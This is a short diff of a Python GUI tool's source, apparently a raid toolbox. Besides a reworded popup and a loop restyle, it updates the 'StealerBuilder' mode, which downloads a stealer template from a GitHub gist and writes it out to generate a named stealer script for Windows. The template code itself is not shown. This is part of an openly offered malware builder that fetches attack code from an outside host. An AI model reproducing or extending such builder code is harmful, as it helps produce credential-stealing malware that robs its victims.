@@ -1380,7 +1380,7 @@ elif mode == 'quickcheck':
 
 elif mode == "StealerBuilder":
     if not sys.platform.startswith("win32"):
-        sg.Popup("Only Supported on windows as of now. Sorry.", title="Yikes")
+        sg.Popup("Only Supported on windows for now. Sorry.", title="Yikes")
         os.kill(os.getpid(), 15)
     if not os.path.exists("RTBStealerBuilder/"):
         os.mkdir("RTBStealerBuilder/")
@@ -1399,7 +1399,7 @@ elif mode == "StealerBuilder":
         else:
             os.chdir('RTBStealerBuilder/')
             pyname = name+'.py'
-            temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/5405f4123165e528bd329e821e7c7921846d2a4c/stealertemplate.py").text
+            temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/715a44f9c115bb207a94ade8d9cd422b112b004f/stealertemplate.py").text
             with open("template.py", "w+") as handle:
                 handle.write(temp)
             with open("template.py") as f:
@@ -1817,7 +1817,7 @@ elif mode == "CPUWIDGET":
                sg.Spin([x + 1 for x in range(10)], 1, key='spin')]]
     window = sg.Window('Running Timer', layout, no_titlebar=True, auto_size_buttons=False, keep_on_top=True,
                        grab_anywhere=True)
-    while (True):
+    while True:
         event, values = window.Read(timeout=10)
         if event is None or event == 'Exit':
             break
